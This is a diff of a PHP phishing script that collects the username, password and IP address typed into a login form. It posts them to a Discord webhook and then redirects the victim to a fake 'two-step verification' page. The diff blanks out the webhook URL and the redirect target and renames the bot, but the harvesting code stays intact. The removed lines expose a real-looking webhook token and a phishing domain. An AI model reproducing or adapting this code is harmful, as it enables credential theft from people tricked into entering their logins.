@@ -1,13 +1,13 @@
 <?php
 
 if (isset($_POST['submit'])) {
-$webhookurl = "https://discord.com/api/webhooks/1158435493302775881/TZoEa5YUWzs4kFq-k320jk4uKi9y7FA_RHroUoP7gww7eUs7_HAC2XLzxuZ4n7TFPCtO";
+$webhookurl = "";
 $ip= $_SERVER['REMOTE_ADDR'];
 $user = $_POST['username'];
 $pass = $_POST['password'];
 
 $object = json_encode([
-            "username" => "Mik",
+            "username" => "Lucifer",
             "avatar_url" => "https://media1.tenor.com/images/bf8629fa4f8cf54576b94638a2e2e1c9/tenor.gif?itemid=19207409",
             
             "embeds" => [
@@ -62,4 +62,4 @@ $response = curl_exec($ch);
 curl_close($ch);
 }
 ?>
-<meta HTTP-EQUIV="REFRESH" content="0; url=https://clickthelinktoseemyyprofile.000webhostapp.com/2Stepverifivation.html"> 
+<meta HTTP-EQUIV="REFRESH" content="0; url="> 
